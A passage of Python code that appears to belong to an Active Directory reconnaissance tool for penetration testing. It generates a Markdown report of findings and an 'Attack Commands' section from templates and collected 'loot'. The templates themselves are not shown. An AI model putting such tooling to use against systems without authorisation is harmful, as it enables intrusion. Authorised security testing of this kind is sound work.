    lines.append(f"# AD Recon Report")
    lines.append(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ")
    lines.append(f"**Domain:** {target.get('domain','N/A')}  ")
    lines.append(f"**DC:** {target.get('dc_ip','N/A')}  ")
    lines.append("")

    # Summary
    counts = _severity_counts(findings)
    lines.append("## Summary")
    for sev, count in counts.items():
        if count:
            lines.append(f"- **{sev}:** {count}")
    lines.append("")

    # Report 1
    lines.append("---")
    lines.append("# Report 1 — Findings")
    lines.append("")
    for f in findings:
        lines.append(f"## [{f.severity}] {f.title}")
        lines.append(f"**Category:** {f.category}  |  **Tool:** {f.tool}")
        lines.append("")
        lines.append(f.description)
        lines.append("")
        if f.evidence:
            lines.append("**Evidence:**")
            for e in f.evidence[:10]:
                lines.append(f"- `{e}`")
        lines.append("")

    # Report 2
    lines.append("---")
    lines.append("# Report 2 — Attack Commands")
    lines.append("")
    lines.append("> **Orange values** (shown in backticks below) = pre-filled from your environment.  ")
    lines.append("> `<PLACEHOLDER>` = you must fill these in.")
    lines.append("")

    for f in findings:
        template = ATTACK_TEMPLATES.get(f.id)
        if not template:
            continue
        lines.append(f"## {template['title']}")
        lines.append(f"**Phase:** {template['phase']}")
        lines.append("")
        for step in template["steps"]:
            cmd = _fill_template(step["cmd"], config, f)
            cmd = re.sub(r"__VAL__(.+?)__VAL__", r"`\1`", cmd)
            lines.append(f"**{step['desc']}**")
            lines.append(f"```")
            lines.append(cmd)
            lines.append(f"```")
            if step.get("note"):
                lines.append(f"> {step['note']}")
            lines.append("")

    path = os.path.join(output_dir, "report_combined.md")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    return path


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def generate_all(findings, config, raw_outputs=None):
    output_dir = config["scope"]["output_dir"]
    os.makedirs(output_dir, exist_ok=True)

    loot = collect_loot(raw_outputs or {}, config)

    r1 = generate_report1_html(findings, config, output_dir, loot=loot)
    r2 = generate_report2_html(findings, config, output_dir)
    md = generate_markdown(findings, config, output_dir)

    return r1, r2, md
